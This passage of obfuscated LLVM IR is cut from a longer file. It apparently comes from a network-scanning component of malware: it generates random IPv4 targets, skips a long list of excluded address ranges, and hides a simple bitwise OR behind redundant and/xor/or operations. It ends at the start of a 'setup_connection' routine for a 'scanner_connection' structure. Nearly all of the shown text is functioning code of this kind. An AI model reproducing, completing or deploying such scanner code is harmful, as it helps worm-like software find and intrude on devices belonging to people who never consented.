  %1882 = icmp eq i32 %1881, 198
  br i1 %1882, label %1883, label %1895

; <label>:1883:                                   ; preds = %1879
  %1884 = load i8, i8* %3, align 1
  %1885 = zext i8 %1884 to i32
  %1886 = icmp eq i32 %1885, 8
  br i1 %1886, label %1887, label %1895

; <label>:1887:                                   ; preds = %1883
  %1888 = load i8, i8* %4, align 1
  %1889 = zext i8 %1888 to i32
  %1890 = icmp sge i32 %1889, 81
  br i1 %1890, label %1891, label %1895

; <label>:1891:                                   ; preds = %1887
  %1892 = load i8, i8* %4, align 1
  %1893 = zext i8 %1892 to i32
  %1894 = icmp slt i32 %1893, 95
  br i1 %1894, label %2331, label %1895

; <label>:1895:                                   ; preds = %1891, %1887, %1883, %1879
  %1896 = load i8, i8* %2, align 1
  %1897 = zext i8 %1896 to i32
  %1898 = icmp eq i32 %1897, 199
  br i1 %1898, label %1899, label %1911

; <label>:1899:                                   ; preds = %1895
  %1900 = load i8, i8* %3, align 1
  %1901 = zext i8 %1900 to i32
  %1902 = icmp eq i32 %1901, 116
  br i1 %1902, label %1903, label %1911

; <label>:1903:                                   ; preds = %1899
  %1904 = load i8, i8* %4, align 1
  %1905 = zext i8 %1904 to i32
  %1906 = icmp sge i32 %1905, 112
  br i1 %1906, label %1907, label %1911

; <label>:1907:                                   ; preds = %1903
  %1908 = load i8, i8* %4, align 1
  %1909 = zext i8 %1908 to i32
  %1910 = icmp slt i32 %1909, 119
  br i1 %1910, label %2331, label %1911

; <label>:1911:                                   ; preds = %1907, %1903, %1899, %1895
  %1912 = load i8, i8* %2, align 1
  %1913 = zext i8 %1912 to i32
  %1914 = icmp eq i32 %1913, 199
  br i1 %1914, label %1915, label %1927

; <label>:1915:                                   ; preds = %1911
  %1916 = load i8, i8* %3, align 1
  %1917 = zext i8 %1916 to i32
  %1918 = icmp eq i32 %1917, 229
  br i1 %1918, label %1919, label %1927

; <label>:1919:                                   ; preds = %1915
  %1920 = load i8, i8* %4, align 1
  %1921 = zext i8 %1920 to i32
  %1922 = icmp sge i32 %1921, 248
  br i1 %1922, label %1923, label %1927

; <label>:1923:                                   ; preds = %1919
  %1924 = load i8, i8* %4, align 1
  %1925 = zext i8 %1924 to i32
  %1926 = icmp slt i32 %1925, 255
  br i1 %1926, label %2331, label %1927

; <label>:1927:                                   ; preds = %1923, %1919, %1915, %1911
  %1928 = load i8, i8* %2, align 1
  %1929 = zext i8 %1928 to i32
  %1930 = icmp eq i32 %1929, 199
  br i1 %1930, label %1931, label %1943

; <label>:1931:                                   ; preds = %1927
  %1932 = load i8, i8* %3, align 1
  %1933 = zext i8 %1932 to i32
  %1934 = icmp eq i32 %1933, 36
  br i1 %1934, label %1935, label %1943

; <label>:1935:                                   ; preds = %1931
  %1936 = load i8, i8* %4, align 1
  %1937 = zext i8 %1936 to i32
  %1938 = icmp sge i32 %1937, 220
  br i1 %1938, label %1939, label %1943

; <label>:1939:                                   ; preds = %1935
  %1940 = load i8, i8* %4, align 1
  %1941 = zext i8 %1940 to i32
  %1942 = icmp slt i32 %1941, 223
  br i1 %1942, label %2331, label %1943

; <label>:1943:                                   ; preds = %1939, %1935, %1931, %1927
  %1944 = load i8, i8* %2, align 1
  %1945 = zext i8 %1944 to i32
  %1946 = icmp eq i32 %1945, 199
  br i1 %1946, label %1947, label %1959

; <label>:1947:                                   ; preds = %1943
  %1948 = load i8, i8* %3, align 1
  %1949 = zext i8 %1948 to i32
  %1950 = icmp eq i32 %1949, 58
  br i1 %1950, label %1951, label %1959

; <label>:1951:                                   ; preds = %1947
  %1952 = load i8, i8* %4, align 1
  %1953 = zext i8 %1952 to i32
  %1954 = icmp sge i32 %1953, 184
  br i1 %1954, label %1955, label %1959

; <label>:1955:                                   ; preds = %1951
  %1956 = load i8, i8* %4, align 1
  %1957 = zext i8 %1956 to i32
  %1958 = icmp slt i32 %1957, 187
  br i1 %1958, label %2331, label %1959

; <label>:1959:                                   ; preds = %1955, %1951, %1947, %1943
  %1960 = load i8, i8* %2, align 1
  %1961 = zext i8 %1960 to i32
  %1962 = icmp eq i32 %1961, 206
  br i1 %1962, label %1963, label %1975

; <label>:1963:                                   ; preds = %1959
  %1964 = load i8, i8* %3, align 1
  %1965 = zext i8 %1964 to i32
  %1966 = icmp eq i32 %1965, 220
  br i1 %1966, label %1967, label %1975

; <label>:1967:                                   ; preds = %1963
  %1968 = load i8, i8* %4, align 1
  %1969 = zext i8 %1968 to i32
  %1970 = icmp sge i32 %1969, 172
  br i1 %1970, label %1971, label %1975

; <label>:1971:                                   ; preds = %1967
  %1972 = load i8, i8* %4, align 1
  %1973 = zext i8 %1972 to i32
  %1974 = icmp slt i32 %1973, 175
  br i1 %1974, label %2331, label %1975

; <label>:1975:                                   ; preds = %1971, %1967, %1963, %1959
  %1976 = load i8, i8* %2, align 1
  %1977 = zext i8 %1976 to i32
  %1978 = icmp eq i32 %1977, 208
  br i1 %1978, label %1979, label %1991

; <label>:1979:                                   ; preds = %1975
  %1980 = load i8, i8* %3, align 1
  %1981 = zext i8 %1980 to i32
  %1982 = icmp eq i32 %1981, 78
  br i1 %1982, label %1983, label %1991

; <label>:1983:                                   ; preds = %1979
  %1984 = load i8, i8* %4, align 1
  %1985 = zext i8 %1984 to i32
  %1986 = icmp sge i32 %1985, 40
  br i1 %1986, label %1987, label %1991

; <label>:1987:                                   ; preds = %1983
  %1988 = load i8, i8* %4, align 1
  %1989 = zext i8 %1988 to i32
  %1990 = icmp slt i32 %1989, 43
  br i1 %1990, label %2331, label %1991

; <label>:1991:                                   ; preds = %1987, %1983, %1979, %1975
  %1992 = load i8, i8* %2, align 1
  %1993 = zext i8 %1992 to i32
  %1994 = icmp eq i32 %1993, 208
  br i1 %1994, label %1995, label %2007

; <label>:1995:                                   ; preds = %1991
  %1996 = load i8, i8* %3, align 1
  %1997 = zext i8 %1996 to i32
  %1998 = icmp eq i32 %1997, 93
  br i1 %1998, label %1999, label %2007

; <label>:1999:                                   ; preds = %1995
  %2000 = load i8, i8* %4, align 1
  %2001 = zext i8 %2000 to i32
  %2002 = icmp sge i32 %2001, 192
  br i1 %2002, label %2003, label %2007

; <label>:2003:                                   ; preds = %1999
  %2004 = load i8, i8* %4, align 1
  %2005 = zext i8 %2004 to i32
  %2006 = icmp slt i32 %2005, 193
  br i1 %2006, label %2331, label %2007

; <label>:2007:                                   ; preds = %2003, %1999, %1995, %1991
  %2008 = load i8, i8* %2, align 1
  %2009 = zext i8 %2008 to i32
  %2010 = icmp eq i32 %2009, 66
  br i1 %2010, label %2011, label %2023

; <label>:2011:                                   ; preds = %2007
  %2012 = load i8, i8* %3, align 1
  %2013 = zext i8 %2012 to i32
  %2014 = icmp eq i32 %2013, 71
  br i1 %2014, label %2015, label %2023

; <label>:2015:                                   ; preds = %2011
  %2016 = load i8, i8* %4, align 1
  %2017 = zext i8 %2016 to i32
  %2018 = icmp sge i32 %2017, 240
  br i1 %2018, label %2019, label %2023

; <label>:2019:                                   ; preds = %2015
  %2020 = load i8, i8* %4, align 1
  %2021 = zext i8 %2020 to i32
  %2022 = icmp slt i32 %2021, 255
  br i1 %2022, label %2331, label %2023

; <label>:2023:                                   ; preds = %2019, %2015, %2011, %2007
  %2024 = load i8, i8* %2, align 1
  %2025 = zext i8 %2024 to i32
  %2026 = icmp eq i32 %2025, 98
  br i1 %2026, label %2027, label %2039

; <label>:2027:                                   ; preds = %2023
  %2028 = load i8, i8* %3, align 1
  %2029 = zext i8 %2028 to i32
  %2030 = icmp eq i32 %2029, 142
  br i1 %2030, label %2031, label %2039

; <label>:2031:                                   ; preds = %2027
  %2032 = load i8, i8* %4, align 1
  %2033 = zext i8 %2032 to i32
  %2034 = icmp sge i32 %2033, 208
  br i1 %2034, label %2035, label %2039

; <label>:2035:                                   ; preds = %2031
  %2036 = load i8, i8* %4, align 1
  %2037 = zext i8 %2036 to i32
  %2038 = icmp slt i32 %2037, 223
  br i1 %2038, label %2331, label %2039

; <label>:2039:                                   ; preds = %2035, %2031, %2027, %2023
  %2040 = load i8, i8* %2, align 1
  %2041 = zext i8 %2040 to i32
  %2042 = icmp eq i32 %2041, 107
  br i1 %2042, label %2043, label %2051

; <label>:2043:                                   ; preds = %2039
  %2044 = load i8, i8* %3, align 1
  %2045 = zext i8 %2044 to i32
  %2046 = icmp sge i32 %2045, 20
  br i1 %2046, label %2047, label %2051

; <label>:2047:                                   ; preds = %2043
  %2048 = load i8, i8* %3, align 1
  %2049 = zext i8 %2048 to i32
  %2050 = icmp slt i32 %2049, 24
  br i1 %2050, label %2331, label %2051

; <label>:2051:                                   ; preds = %2047, %2043, %2039
  %2052 = load i8, i8* %2, align 1
  %2053 = zext i8 %2052 to i32
  %2054 = icmp eq i32 %2053, 35
  br i1 %2054, label %2055, label %2063

; <label>:2055:                                   ; preds = %2051
  %2056 = load i8, i8* %3, align 1
  %2057 = zext i8 %2056 to i32
  %2058 = icmp sge i32 %2057, 159
  br i1 %2058, label %2059, label %2063

; <label>:2059:                                   ; preds = %2055
  %2060 = load i8, i8* %3, align 1
  %2061 = zext i8 %2060 to i32
  %2062 = icmp slt i32 %2061, 183
  br i1 %2062, label %2331, label %2063

; <label>:2063:                                   ; preds = %2059, %2055, %2051
  %2064 = load i8, i8* %2, align 1
  %2065 = zext i8 %2064 to i32
  %2066 = icmp eq i32 %2065, 52
  br i1 %2066, label %2067, label %2075

; <label>:2067:                                   ; preds = %2063
  %2068 = load i8, i8* %3, align 1
  %2069 = zext i8 %2068 to i32
  %2070 = icmp sge i32 %2069, 1
  br i1 %2070, label %2071, label %2075

; <label>:2071:                                   ; preds = %2067
  %2072 = load i8, i8* %3, align 1
  %2073 = zext i8 %2072 to i32
  %2074 = icmp slt i32 %2073, 95
  br i1 %2074, label %2331, label %2075

; <label>:2075:                                   ; preds = %2071, %2067, %2063
  %2076 = load i8, i8* %2, align 1
  %2077 = zext i8 %2076 to i32
  %2078 = icmp eq i32 %2077, 52
  br i1 %2078, label %2079, label %2087

; <label>:2079:                                   ; preds = %2075
  %2080 = load i8, i8* %3, align 1
  %2081 = zext i8 %2080 to i32
  %2082 = icmp sge i32 %2081, 95
  br i1 %2082, label %2083, label %2087

; <label>:2083:                                   ; preds = %2079
  %2084 = load i8, i8* %3, align 1
  %2085 = zext i8 %2084 to i32
  %2086 = icmp slt i32 %2085, 255
  br i1 %2086, label %2331, label %2087

; <label>:2087:                                   ; preds = %2083, %2079, %2075
  %2088 = load i8, i8* %2, align 1
  %2089 = zext i8 %2088 to i32
  %2090 = icmp eq i32 %2089, 54
  br i1 %2090, label %2091, label %2099

; <label>:2091:                                   ; preds = %2087
  %2092 = load i8, i8* %3, align 1
  %2093 = zext i8 %2092 to i32
  %2094 = icmp sge i32 %2093, 64
  br i1 %2094, label %2095, label %2099

; <label>:2095:                                   ; preds = %2091
  %2096 = load i8, i8* %3, align 1
  %2097 = zext i8 %2096 to i32
  %2098 = icmp slt i32 %2097, 95
  br i1 %2098, label %2331, label %2099

; <label>:2099:                                   ; preds = %2095, %2091, %2087
  %2100 = load i8, i8* %2, align 1
  %2101 = zext i8 %2100 to i32
  %2102 = icmp eq i32 %2101, 54
  br i1 %2102, label %2103, label %2111

; <label>:2103:                                   ; preds = %2099
  %2104 = load i8, i8* %3, align 1
  %2105 = zext i8 %2104 to i32
  %2106 = icmp sge i32 %2105, 144
  br i1 %2106, label %2107, label %2111

; <label>:2107:                                   ; preds = %2103
  %2108 = load i8, i8* %3, align 1
  %2109 = zext i8 %2108 to i32
  %2110 = icmp slt i32 %2109, 255
  br i1 %2110, label %2331, label %2111

; <label>:2111:                                   ; preds = %2107, %2103, %2099
  %2112 = load i8, i8* %2, align 1
  %2113 = zext i8 %2112 to i32
  %2114 = icmp eq i32 %2113, 13
  br i1 %2114, label %2115, label %2123

; <label>:2115:                                   ; preds = %2111
  %2116 = load i8, i8* %3, align 1
  %2117 = zext i8 %2116 to i32
  %2118 = icmp sge i32 %2117, 52
  br i1 %2118, label %2119, label %2123

; <label>:2119:                                   ; preds = %2115
  %2120 = load i8, i8* %3, align 1
  %2121 = zext i8 %2120 to i32
  %2122 = icmp slt i32 %2121, 60
  br i1 %2122, label %2331, label %2123

; <label>:2123:                                   ; preds = %2119, %2115, %2111
  %2124 = load i8, i8* %2, align 1
  %2125 = zext i8 %2124 to i32
  %2126 = icmp eq i32 %2125, 13
  br i1 %2126, label %2127, label %2135

; <label>:2127:                                   ; preds = %2123
  %2128 = load i8, i8* %3, align 1
  %2129 = zext i8 %2128 to i32
  %2130 = icmp sge i32 %2129, 112
  br i1 %2130, label %2131, label %2135

; <label>:2131:                                   ; preds = %2127
  %2132 = load i8, i8* %3, align 1
  %2133 = zext i8 %2132 to i32
  %2134 = icmp slt i32 %2133, 115
  br i1 %2134, label %2331, label %2135

; <label>:2135:                                   ; preds = %2131, %2127, %2123
  %2136 = load i8, i8* %2, align 1
  %2137 = zext i8 %2136 to i32
  %2138 = icmp eq i32 %2137, 163
  br i1 %2138, label %2139, label %2143

; <label>:2139:                                   ; preds = %2135
  %2140 = load i8, i8* %3, align 1
  %2141 = zext i8 %2140 to i32
  %2142 = icmp eq i32 %2141, 172
  br i1 %2142, label %2331, label %2143

; <label>:2143:                                   ; preds = %2139, %2135
  %2144 = load i8, i8* %2, align 1
  %2145 = zext i8 %2144 to i32
  %2146 = icmp eq i32 %2145, 51
  br i1 %2146, label %2147, label %2155

; <label>:2147:                                   ; preds = %2143
  %2148 = load i8, i8* %3, align 1
  %2149 = zext i8 %2148 to i32
  %2150 = icmp sge i32 %2149, 15
  br i1 %2150, label %2151, label %2155

; <label>:2151:                                   ; preds = %2147
  %2152 = load i8, i8* %3, align 1
  %2153 = zext i8 %2152 to i32
  %2154 = icmp slt i32 %2153, 255
  br i1 %2154, label %2331, label %2155

; <label>:2155:                                   ; preds = %2151, %2147, %2143
  %2156 = load i8, i8* %2, align 1
  %2157 = zext i8 %2156 to i32
  %2158 = icmp eq i32 %2157, 79
  br i1 %2158, label %2159, label %2171

; <label>:2159:                                   ; preds = %2155
  %2160 = load i8, i8* %3, align 1
  %2161 = zext i8 %2160 to i32
  %2162 = icmp eq i32 %2161, 121
  br i1 %2162, label %2163, label %2171

; <label>:2163:                                   ; preds = %2159
  %2164 = load i8, i8* %4, align 1
  %2165 = zext i8 %2164 to i32
  %2166 = icmp sge i32 %2165, 128
  br i1 %2166, label %2167, label %2171

; <label>:2167:                                   ; preds = %2163
  %2168 = load i8, i8* %4, align 1
  %2169 = zext i8 %2168 to i32
  %2170 = icmp slt i32 %2169, 255
  br i1 %2170, label %2331, label %2171

; <label>:2171:                                   ; preds = %2167, %2163, %2159, %2155
  %2172 = load i8, i8* %2, align 1
  %2173 = zext i8 %2172 to i32
  %2174 = icmp eq i32 %2173, 212
  br i1 %2174, label %2175, label %2187

; <label>:2175:                                   ; preds = %2171
  %2176 = load i8, i8* %3, align 1
  %2177 = zext i8 %2176 to i32
  %2178 = icmp eq i32 %2177, 47
  br i1 %2178, label %2179, label %2187

; <label>:2179:                                   ; preds = %2175
  %2180 = load i8, i8* %4, align 1
  %2181 = zext i8 %2180 to i32
  %2182 = icmp sge i32 %2181, 224
  br i1 %2182, label %2183, label %2187

; <label>:2183:                                   ; preds = %2179
  %2184 = load i8, i8* %4, align 1
  %2185 = zext i8 %2184 to i32
  %2186 = icmp slt i32 %2185, 255
  br i1 %2186, label %2331, label %2187

; <label>:2187:                                   ; preds = %2183, %2179, %2175, %2171
  %2188 = load i8, i8* %2, align 1
  %2189 = zext i8 %2188 to i32
  %2190 = icmp eq i32 %2189, 89
  br i1 %2190, label %2191, label %2203

; <label>:2191:                                   ; preds = %2187
  %2192 = load i8, i8* %3, align 1
  %2193 = zext i8 %2192 to i32
  %2194 = icmp eq i32 %2193, 34
  br i1 %2194, label %2195, label %2203

; <label>:2195:                                   ; preds = %2191
  %2196 = load i8, i8* %4, align 1
  %2197 = zext i8 %2196 to i32
  %2198 = icmp sge i32 %2197, 96
  br i1 %2198, label %2199, label %2203

; <label>:2199:                                   ; preds = %2195
  %2200 = load i8, i8* %4, align 1
  %2201 = zext i8 %2200 to i32
  %2202 = icmp slt i32 %2201, 97
  br i1 %2202, label %2331, label %2203

; <label>:2203:                                   ; preds = %2199, %2195, %2191, %2187
  %2204 = load i8, i8* %2, align 1
  %2205 = zext i8 %2204 to i32
  %2206 = icmp eq i32 %2205, 219
  br i1 %2206, label %2207, label %2215

; <label>:2207:                                   ; preds = %2203
  %2208 = load i8, i8* %3, align 1
  %2209 = zext i8 %2208 to i32
  %2210 = icmp sge i32 %2209, 216
  br i1 %2210, label %2211, label %2215

; <label>:2211:                                   ; preds = %2207
  %2212 = load i8, i8* %3, align 1
  %2213 = zext i8 %2212 to i32
  %2214 = icmp slt i32 %2213, 231
  br i1 %2214, label %2331, label %2215

; <label>:2215:                                   ; preds = %2211, %2207, %2203
  %2216 = load i8, i8* %2, align 1
  %2217 = zext i8 %2216 to i32
  %2218 = icmp eq i32 %2217, 23
  br i1 %2218, label %2219, label %2227

; <label>:2219:                                   ; preds = %2215
  %2220 = load i8, i8* %3, align 1
  %2221 = zext i8 %2220 to i32
  %2222 = icmp sge i32 %2221, 94
  br i1 %2222, label %2223, label %2227

; <label>:2223:                                   ; preds = %2219
  %2224 = load i8, i8* %3, align 1
  %2225 = zext i8 %2224 to i32
  %2226 = icmp slt i32 %2225, 109
  br i1 %2226, label %2331, label %2227

; <label>:2227:                                   ; preds = %2223, %2219, %2215
  %2228 = load i8, i8* %2, align 1
  %2229 = zext i8 %2228 to i32
  %2230 = icmp eq i32 %2229, 178
  br i1 %2230, label %2231, label %2239

; <label>:2231:                                   ; preds = %2227
  %2232 = load i8, i8* %3, align 1
  %2233 = zext i8 %2232 to i32
  %2234 = icmp sge i32 %2233, 62
  br i1 %2234, label %2235, label %2239

; <label>:2235:                                   ; preds = %2231
  %2236 = load i8, i8* %3, align 1
  %2237 = zext i8 %2236 to i32
  %2238 = icmp slt i32 %2237, 63
  br i1 %2238, label %2331, label %2239

; <label>:2239:                                   ; preds = %2235, %2231, %2227
  %2240 = load i8, i8* %2, align 1
  %2241 = zext i8 %2240 to i32
  %2242 = icmp eq i32 %2241, 106
  br i1 %2242, label %2243, label %2251

; <label>:2243:                                   ; preds = %2239
  %2244 = load i8, i8* %3, align 1
  %2245 = zext i8 %2244 to i32
  %2246 = icmp sge i32 %2245, 182
  br i1 %2246, label %2247, label %2251

; <label>:2247:                                   ; preds = %2243
  %2248 = load i8, i8* %3, align 1
  %2249 = zext i8 %2248 to i32
  %2250 = icmp slt i32 %2249, 189
  br i1 %2250, label %2331, label %2251

; <label>:2251:                                   ; preds = %2247, %2243, %2239
  %2252 = load i8, i8* %2, align 1
  %2253 = zext i8 %2252 to i32
  %2254 = icmp eq i32 %2253, 34
  br i1 %2254, label %2255, label %2263

; <label>:2255:                                   ; preds = %2251
  %2256 = load i8, i8* %3, align 1
  %2257 = zext i8 %2256 to i32
  %2258 = icmp sge i32 %2257, 245
  br i1 %2258, label %2259, label %2263

; <label>:2259:                                   ; preds = %2255
  %2260 = load i8, i8* %3, align 1
  %2261 = zext i8 %2260 to i32
  %2262 = icmp slt i32 %2261, 255
  br i1 %2262, label %2331, label %2263

; <label>:2263:                                   ; preds = %2259, %2255, %2251
  %2264 = load i8, i8* %2, align 1
  %2265 = zext i8 %2264 to i32
  %2266 = icmp eq i32 %2265, 87
  br i1 %2266, label %2267, label %2275

; <label>:2267:                                   ; preds = %2263
  %2268 = load i8, i8* %3, align 1
  %2269 = zext i8 %2268 to i32
  %2270 = icmp sge i32 %2269, 97
  br i1 %2270, label %2271, label %2275

; <label>:2271:                                   ; preds = %2267
  %2272 = load i8, i8* %3, align 1
  %2273 = zext i8 %2272 to i32
  %2274 = icmp slt i32 %2273, 99
  br i1 %2274, label %2331, label %2275

; <label>:2275:                                   ; preds = %2271, %2267, %2263
  %2276 = load i8, i8* %2, align 1
  %2277 = zext i8 %2276 to i32
  %2278 = icmp eq i32 %2277, 86
  br i1 %2278, label %2279, label %2283

; <label>:2279:                                   ; preds = %2275
  %2280 = load i8, i8* %3, align 1
  %2281 = zext i8 %2280 to i32
  %2282 = icmp eq i32 %2281, 208
  br i1 %2282, label %2331, label %2283

; <label>:2283:                                   ; preds = %2279, %2275
  %2284 = load i8, i8* %2, align 1
  %2285 = zext i8 %2284 to i32
  %2286 = icmp eq i32 %2285, 86
  br i1 %2286, label %2287, label %2291

; <label>:2287:                                   ; preds = %2283
  %2288 = load i8, i8* %3, align 1
  %2289 = zext i8 %2288 to i32
  %2290 = icmp eq i32 %2289, 209
  br i1 %2290, label %2331, label %2291

; <label>:2291:                                   ; preds = %2287, %2283
  %2292 = load i8, i8* %2, align 1
  %2293 = zext i8 %2292 to i32
  %2294 = icmp eq i32 %2293, 193
  br i1 %2294, label %2295, label %2299

; <label>:2295:                                   ; preds = %2291
  %2296 = load i8, i8* %3, align 1
  %2297 = zext i8 %2296 to i32
  %2298 = icmp eq i32 %2297, 164
  br i1 %2298, label %2331, label %2299

; <label>:2299:                                   ; preds = %2295, %2291
  %2300 = load i8, i8* %2, align 1
  %2301 = zext i8 %2300 to i32
  %2302 = icmp eq i32 %2301, 120
  br i1 %2302, label %2303, label %2311

; <label>:2303:                                   ; preds = %2299
  %2304 = load i8, i8* %3, align 1
  %2305 = zext i8 %2304 to i32
  %2306 = icmp sge i32 %2305, 103
  br i1 %2306, label %2307, label %2311

; <label>:2307:                                   ; preds = %2303
  %2308 = load i8, i8* %3, align 1
  %2309 = zext i8 %2308 to i32
  %2310 = icmp slt i32 %2309, 108
  br i1 %2310, label %2331, label %2311

; <label>:2311:                                   ; preds = %2307, %2303, %2299
  %2312 = load i8, i8* %2, align 1
  %2313 = zext i8 %2312 to i32
  %2314 = icmp eq i32 %2313, 188
  br i1 %2314, label %2315, label %2319

; <label>:2315:                                   ; preds = %2311
  %2316 = load i8, i8* %3, align 1
  %2317 = zext i8 %2316 to i32
  %2318 = icmp eq i32 %2317, 68
  br i1 %2318, label %2331, label %2319

; <label>:2319:                                   ; preds = %2315, %2311
  %2320 = load i8, i8* %2, align 1
  %2321 = zext i8 %2320 to i32
  %2322 = icmp eq i32 %2321, 78
  br i1 %2322, label %2323, label %2327

; <label>:2323:                                   ; preds = %2319
  %2324 = load i8, i8* %3, align 1
  %2325 = zext i8 %2324 to i32
  %2326 = icmp eq i32 %2325, 46
  br i1 %2326, label %2331, label %2327

; <label>:2327:                                   ; preds = %2323, %2319
  %2328 = load i8, i8* %2, align 1
  %2329 = zext i8 %2328 to i32
  %2330 = icmp eq i32 %2329, 224
  br label %2331

; <label>:2331:                                   ; preds = %2327, %2323, %2315, %2307, %2295, %2287, %2279, %2271, %2259, %2247, %2235, %2223, %2211, %2199, %2183, %2167, %2151, %2139, %2131, %2119, %2107, %2095, %2083, %2071, %2059, %2047, %2035, %2019, %2003, %1987, %1971, %1955, %1939, %1923, %1907, %1891, %1875, %1859, %1843, %1827, %1811, %1795, %1779, %1763, %1747, %1739, %1731, %1723, %1715, %1707, %1699, %1691, %1683, %1675, %1667, %1659, %1651, %1643, %1635, %1627, %1619, %1611, %1595, %1579, %1563, %1547, %1531, %1515, %1499, %1483, %1467, %1451, %1435, %1419, %1411, %1403, %1387, %1371, %1355, %1339, %1323, %1307, %1291, %1275, %1259, %1243, %1227, %1211, %1195, %1179, %1163, %1147, %1131, %1115, %1099, %1083, %1067, %1059, %1051, %1043, %1035, %1027, %1019, %1011, %1003, %995, %987, %979, %971, %959, %947, %935, %923, %911, %899, %887, %875, %863, %851, %839, %827, %815, %803, %791, %779, %767, %755, %743, %731, %719, %707, %695, %683, %671, %659, %647, %635, %623, %611, %599, %587, %575, %563, %551, %539, %527, %515, %503, %491, %479, %471, %459, %447, %439, %431, %423, %415, %407, %399, %391, %383, %375, %367, %359, %351, %343, %335, %327, %319, %311, %303, %295, %287, %279, %271, %263, %255, %247, %239, %231, %223, %215, %207, %199, %191, %183, %175, %167, %159, %151, %143, %135, %127, %123, %119, %115, %111, %107, %103, %99, %95, %91, %87, %83, %79, %75, %71, %67, %63, %59, %55, %51, %47, %43, %39
  %2332 = phi i1 [ true, %2323 ], [ true, %2315 ], [ true, %2307 ], [ true, %2295 ], [ true, %2287 ], [ true, %2279 ], [ true, %2271 ], [ true, %2259 ], [ true, %2247 ], [ true, %2235 ], [ true, %2223 ], [ true, %2211 ], [ true, %2199 ], [ true, %2183 ], [ true, %2167 ], [ true, %2151 ], [ true, %2139 ], [ true, %2131 ], [ true, %2119 ], [ true, %2107 ], [ true, %2095 ], [ true, %2083 ], [ true, %2071 ], [ true, %2059 ], [ true, %2047 ], [ true, %2035 ], [ true, %2019 ], [ true, %2003 ], [ true, %1987 ], [ true, %1971 ], [ true, %1955 ], [ true, %1939 ], [ true, %1923 ], [ true, %1907 ], [ true, %1891 ], [ true, %1875 ], [ true, %1859 ], [ true, %1843 ], [ true, %1827 ], [ true, %1811 ], [ true, %1795 ], [ true, %1779 ], [ true, %1763 ], [ true, %1747 ], [ true, %1739 ], [ true, %1731 ], [ true, %1723 ], [ true, %1715 ], [ true, %1707 ], [ true, %1699 ], [ true, %1691 ], [ true, %1683 ], [ true, %1675 ], [ true, %1667 ], [ true, %1659 ], [ true, %1651 ], [ true, %1643 ], [ true, %1635 ], [ true, %1627 ], [ true, %1619 ], [ true, %1611 ], [ true, %1595 ], [ true, %1579 ], [ true, %1563 ], [ true, %1547 ], [ true, %1531 ], [ true, %1515 ], [ true, %1499 ], [ true, %1483 ], [ true, %1467 ], [ true, %1451 ], [ true, %1435 ], [ true, %1419 ], [ true, %1411 ], [ true, %1403 ], [ true, %1387 ], [ true, %1371 ], [ true, %1355 ], [ true, %1339 ], [ true, %1323 ], [ true, %1307 ], [ true, %1291 ], [ true, %1275 ], [ true, %1259 ], [ true, %1243 ], [ true, %1227 ], [ true, %1211 ], [ true, %1195 ], [ true, %1179 ], [ true, %1163 ], [ true, %1147 ], [ true, %1131 ], [ true, %1115 ], [ true, %1099 ], [ true, %1083 ], [ true, %1067 ], [ true, %1059 ], [ true, %1051 ], [ true, %1043 ], [ true, %1035 ], [ true, %1027 ], [ true, %1019 ], [ true, %1011 ], [ true, %1003 ], [ true, %995 ], [ true, %987 ], [ true, %979 ], [ true, %971 ], [ true, %959 ], [ true, %947 ], [ true, %935 ], [ true, %923 ], [ true, %911 ], [ true, %899 ], [ true, %887 ], [ true, %875 ], [ true, %863 ], [ true, %851 ], [ true, %839 ], [ true, %827 ], [ true, %815 ], [ true, %803 ], [ true, %791 ], [ true, %779 ], [ true, %767 ], [ true, %755 ], [ true, %743 ], [ true, %731 ], [ true, %719 ], [ true, %707 ], [ true, %695 ], [ true, %683 ], [ true, %671 ], [ true, %659 ], [ true, %647 ], [ true, %635 ], [ true, %623 ], [ true, %611 ], [ true, %599 ], [ true, %587 ], [ true, %575 ], [ true, %563 ], [ true, %551 ], [ true, %539 ], [ true, %527 ], [ true, %515 ], [ true, %503 ], [ true, %491 ], [ true, %479 ], [ true, %471 ], [ true, %459 ], [ true, %447 ], [ true, %439 ], [ true, %431 ], [ true, %423 ], [ true, %415 ], [ true, %407 ], [ true, %399 ], [ true, %391 ], [ true, %383 ], [ true, %375 ], [ true, %367 ], [ true, %359 ], [ true, %351 ], [ true, %343 ], [ true, %335 ], [ true, %327 ], [ true, %319 ], [ true, %311 ], [ true, %303 ], [ true, %295 ], [ true, %287 ], [ true, %279 ], [ true, %271 ], [ true, %263 ], [ true, %255 ], [ true, %247 ], [ true, %239 ], [ true, %231 ], [ true, %223 ], [ true, %215 ], [ true, %207 ], [ true, %199 ], [ true, %191 ], [ true, %183 ], [ true, %175 ], [ true, %167 ], [ true, %159 ], [ true, %151 ], [ true, %143 ], [ true, %135 ], [ true, %127 ], [ true, %123 ], [ true, %119 ], [ true, %115 ], [ true, %111 ], [ true, %107 ], [ true, %103 ], [ true, %99 ], [ true, %95 ], [ true, %91 ], [ true, %87 ], [ true, %83 ], [ true, %79 ], [ true, %75 ], [ true, %71 ], [ true, %67 ], [ true, %63 ], [ true, %59 ], [ true, %55 ], [ true, %51 ], [ true, %47 ], [ true, %43 ], [ true, %39 ], [ %2330, %2327 ]
  br i1 %2332, label %6, label %2333

; <label>:2333:                                   ; preds = %2331
  %2334 = load i8, i8* %2, align 1
  %2335 = zext i8 %2334 to i32
  %2336 = shl i32 %2335, 24
  %2337 = load i8, i8* %3, align 1
  %2338 = zext i8 %2337 to i32
  %2339 = shl i32 %2338, 16
  %2340 = and i32 %2336, %2339
  %2341 = xor i32 %2336, %2339
  %2342 = or i32 %2340, %2341
  %2343 = or i32 %2336, %2339
  %2344 = load i8, i8* %4, align 1
  %2345 = zext i8 %2344 to i32
  %2346 = shl i32 %2345, 8
  %2347 = and i32 %2342, %2346
  %2348 = xor i32 %2342, %2346
  %2349 = or i32 %2347, %2348
  %2350 = or i32 %2342, %2346
  %2351 = load i8, i8* %5, align 1
  %2352 = zext i8 %2351 to i32
  %2353 = shl i32 %2352, 0
  %2354 = and i32 %2349, %2353
  %2355 = xor i32 %2349, %2353
  %2356 = or i32 %2354, %2355
  %2357 = or i32 %2349, %2353
  %2358 = call i32 @htonl(i32 %2356) #7
  ret i32 %2358
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
